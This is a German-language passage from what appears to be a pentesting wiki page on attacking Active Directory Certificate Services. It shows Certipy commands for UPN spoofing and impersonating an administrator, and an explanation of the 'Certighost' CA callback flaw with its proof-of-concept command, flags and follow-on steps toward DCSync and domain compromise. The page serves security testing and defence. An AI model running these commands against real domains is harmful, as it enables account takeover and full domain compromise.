-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Schritt 5: Setze den UPN des „Opfer“-Kontos zurück.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Schritt 6: Als der Zieladministrator authentifizieren.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Erklärung

**Certighost** missbraucht einen **AD CS enrollment chase / callback path**, bei dem die CA vom Anfragenden bereitgestellte Request-Attribute verwendet, um die Identität aufzulösen, die im ausgestellten Zertifikat eingetragen werden soll. Im öffentlichen PoC enthält der manipulierte Request:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: vom Angreifer kontrollierter Host bzw. IP-Adresse, die die CA kontaktiert
- **`rmd`**: der **DNS-Name des Ziel-Domain-Controllers**, der imitiert werden soll

Wenn die CA diesem chase folgt, verbindet sie sich über **SMB/LSA (`445`)** und **LDAP (`389`)** mit dem Angreifer. Der Angreifer verwendet ein **echtes Maschinenkonto** (normalerweise über das standardmäßige **`ms-DS-MachineAccountQuota`** erstellt), sodass die Callback-Sitzung als gültiger Domain Principal authentifiziert wird. Die Rogue-Services geben jedoch stattdessen die Identitätsattribute des **Ziel-DCs** zurück:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Wenn die CA die zurückgegebene Identität **nicht kryptografisch an den authentifizierten Callback Principal bindet**, kann sie ein Zertifikat für den **Domain Controller** ausstellen, obwohl die Sitzung als das vom Angreifer kontrollierte Maschinenkonto authentifiziert wurde. Dadurch unterscheidet sich der Fehler konzeptionell von **Certifried**: Statt AD-Attribute wie `dNSHostName` umzuschreiben, **ersetzt der Angreifer Identitätsdaten während der CA-Callback-Auflösung**.<sup>[[2]](#references)</sup>

**Nützliche Voraussetzungen:**

- Gering privilegierte **Domain-Credentials**
- Möglichkeit, ein Computerkonto zu **erstellen oder wiederzuverwenden**
- Netzwerkerreichbarkeit von der **CA** zu den vom Angreifer kontrollierten **Ports `389` und `445`**
- Verwundbarer bzw. ungepatchter CA-Request-Pfad (das Microsoft-Update vom **14. Juli 2026** fügte **DC-Validierung für `cdc`** sowie einen **Vergleich der aufgelösten SID** hinzu)

Die resultierende **`.pfx`** kann anschließend für **PKINIT** verwendet werden, wodurch ein **`.ccache`** und im veröffentlichten PoC-Ablauf der **NT-Hash des Ziel-DCs** erzeugt werden. Dies reicht normalerweise für eine **vollständige Kompromittierung der Domain** aus.

### Ausnutzung

Der öffentliche PoC automatisiert die vollständige Angriffskette:<sup>[[1]](#references)</sup>

1. Ein vom Angreifer kontrolliertes **Maschinenkonto** erstellen oder wiederverwenden.
2. **Rogue LDAP- und SMB/LSA-Listener** auf `389` und `445` starten.
3. Eine Zertifikatsanforderung mit vom Angreifer kontrollierten **`cdc`**- und Ziel-**`rmd`**-Attributen übermitteln.
4. Die CA sich als das kontrollierte Maschinenkonto bei den Rogue-Listenern authentifizieren lassen, aber die Identitätsabfragen mit den Attributen des **Ziel-DCs** beantworten.
5. Ein von der CA signiertes **DC-Zertifikat** empfangen und anschließend für **PKINIT** verwenden.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Nützliche Laufzeit-Flags aus dem PoC:

- `--listener <ip>`: wählt explizit die in `cdc` beworbene Callback-IP aus
- `--computer-name <NAME$>`: verwendet ein vorhandenes Machine Account erneut, anstatt ein neues zu erstellen

**Betriebshinweise:**

- Der PoC benötigt **root**, da er an **privilegierte Ports** `389` und `445` gebunden wird.
- Eine erfolgreiche Exploitation schreibt lokal ein **DC `.pfx`** und einen **Kerberos `.ccache`**.
- Da das Zertifikat einem **Domain Controller Account** zugeordnet wird, können Folgeaktionen **zertifikatsbasierte Kerberos-Authentifizierung**, **DCSync** und die Wiederverwendung des erlangten **Machine NT Hash** umfassen.<sup>[[2]](#references)</sup>

## Kompromittierung von Forests mit Zertifikaten im Passiv erklärt

### Aufbrechen von Forest Trusts durch kompromittierte CAs

Die Konfiguration für die **forestübergreifende Enrollment** wird relativ unkompliziert gestaltet. Das **Root-CA-Zertifikat** des Resource Forest wird von Administratoren in den **Account Forests veröffentlicht**, und die **Enterprise-CA**-Zertifikate des Resource Forest werden den Containern `NTAuthCertificates` und AIA in jedem Account Forest **hinzugefügt**. Zur Klarstellung: Durch diese Anordnung erhält die **CA im Resource Forest vollständige Kontrolle** über alle anderen Forests, für die sie PKI verwaltet. Sollte diese CA **von Angreifern kompromittiert werden**, könnten Zertifikate für alle Benutzer sowohl im Resource Forest als auch in den Account Forests **von ihnen gefälscht werden**, wodurch die Sicherheitsgrenze des Forests aufgebrochen würde.<sup>[[6]](#references)</sup>

### Enrollment-Berechtigungen für Foreign Principals

In Umgebungen mit mehreren Forests ist Vorsicht im Hinblick auf Enterprise CAs erforderlich, die **Zertifikatvorlagen veröffentlichen**, welche **Authenticated Users oder Foreign Principals** (Benutzer/Gruppen außerhalb des Forests, zu dem die Enterprise CA gehört) **Enrollment- und Bearbeitungsrechte** gewähren.\
Bei der Authentifizierung über einen Trust wird die **Authenticated Users SID** von AD zum Token des Benutzers hinzugefügt. Wenn eine Domain daher über eine Enterprise CA mit einer Vorlage verfügt, die **Authenticated Users Enrollment-Rechte gewährt**, könnte ein Benutzer aus einem anderen Forest diese Vorlage möglicherweise **enrollen**. Wenn durch eine Vorlage **Enrollment-Rechte ausdrücklich einem Foreign Principal gewährt werden**, wird auf ähnliche Weise eine **forestübergreifende Access-Control-Beziehung geschaffen**, wodurch ein Principal aus einem Forest **eine Vorlage aus einem anderen Forest enrollen** kann.

Beide Szenarien führen zu einer **Vergrößerung der Angriffsfläche** von einem Forest zum anderen. Die Einstellungen der Zertifikatvorlage könnten von einem Angreifer ausgenutzt werden, um zusätzliche Berechtigungen in einer fremden Domain zu erlangen.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC-Repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n – Technische Analyse von Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps-Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Zertifiziertes Eigentum: Missbrauch von Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound-GUI, neue Authentifizierungs- und Request-Methoden und mehr](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Missbrauch des Key-Trust-Account-Mappings zur Account-Übernahme](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Die Geschichte der erweiterten Schlüsselverwendung](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relay zu Active Directory Certificate Services über RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell-Zugriff auf die ADCS-CA mit YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS-ESC13-Abuse-Technik](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS-ESC14-Abuse-Technik](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy-Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Nicht nur ein weiterer AD-CS-ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Fehlkonfiguration und Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
